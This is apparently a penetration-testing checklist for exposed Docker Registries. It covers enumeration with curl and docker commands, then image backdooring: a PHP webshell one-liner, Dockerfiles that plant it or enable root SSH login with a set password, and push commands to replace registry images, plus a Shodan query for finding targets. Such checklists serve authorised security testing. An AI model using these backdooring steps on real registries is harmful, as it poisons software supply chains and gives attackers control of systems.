# Docker Registry Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating Docker Registry (port 5000), I realistically expect to find:

- [ ] Publicly accessible registry without authentication
- [ ] List of image repositories and tags
- [ ] Image manifests revealing layer history
- [ ] Sensitive data in image layers (keys, configs, passwords)
- [ ] Ability to pull and inspect images locally
- [ ] Potential for pushing backdoored images if write access is allowed

---

## ‚úÖ Docker Registry Pentest Checklist

- [ ] **Banner/Service Fingerprint**
  - Verify service detection from Nmap:
    ```
    nmap -sV -p5000 <IP>
    ```
  - Quick manual probe:
    ```
    curl -s http://<IP>:5000/
    curl -s http://<IP>:5000/v2/
    ```

---

- [ ] **Check for Catalog Access**
  - List all repositories:
    ```
    curl -s http://<IP>:5000/v2/_catalog
    ```
  - Expected outputs:
    - `{"repositories":["alpine","ubuntu"]}`
    - Or error if authentication required:
      ```
      {"errors":[{"code":"UNAUTHORIZED","message":"authentication required"}]}
      ```

---

- [ ] **Authentication Testing**
  - Try basic auth if needed:
    ```
    curl -u username:password http://<IP>:5000/v2/_catalog
    ```
  - Check if HTTPS is required:
    ```
    curl -k https://<IP>:5000/v2/_catalog
    ```

---

## ‚úÖ Repository Enumeration

- [ ] **List Tags for Each Repo**
    ```
    curl -s http://<IP>:5000/v2/<repo>/tags/list
    ```

- [ ] **Get Image Manifests**
    ```
    curl -s http://<IP>:5000/v2/<repo>/manifests/<tag>
    ```

---

## ‚úÖ Download & Inspect Image Layers

- [ ] **Pull Blobs**
    ```
    curl http://<IP>:5000/v2/<repo>/blobs/<sha> --output layer.tar
    ```
  - Inspect contents:
    ```
    tar -xf layer.tar
    ```
  - ‚ö†Ô∏è **Tip**: Extract each blob in a separate folder to avoid overwriting files.

---

## ‚úÖ Using Docker Client

- [ ] **Pull Image from Registry**
    ```
    docker pull <IP>:5000/<repo>:<tag>
    ```

- [ ] **Check Image History**
    ```
    docker history <IP>:5000/<repo>:<tag>
    ```

- [ ] **Run a Container**
    ```
    docker run -it <IP>:5000/<repo>:<tag> /bin/bash
    ```

---

## ‚úÖ Backdooring Images

- [ ] **Create Simple Webshell (Example)**
    ```bash
    echo "<?php echo shell_exec(\$_GET['cmd']); ?>" > shell.php
    ```

- [ ] **Sample Dockerfile to Add Webshell**
    ```dockerfile
    FROM <IP>:5000/wordpress
    COPY shell.php /app/
    RUN chmod 777 /app/shell.php
    ```

- [ ] **Build and Push Backdoored Image**
    ```bash
    docker build -t <IP>:5000/wordpress .
    docker push <IP>:5000/wordpress
    ```

---

## ‚úÖ SSHD Example Backdoor

- [ ] **Modify sshd_config**
    - Ensure `PermitRootLogin yes`
- [ ] **Sample Dockerfile**
    ```dockerfile
    FROM <IP>:5000/sshd-docker-cli
    COPY sshd_config /etc/ssh/
    RUN echo root:password | chpasswd
    ```
- [ ] **Build and Push**
    ```bash
    docker build -t <IP>:5000/sshd-docker-cli .
    docker push <IP>:5000/sshd-docker-cli
    ```

---

## ‚úÖ Shodan Search

- [ ] Discover exposed Docker Registries:
    ```
    port:5000
    ```

---
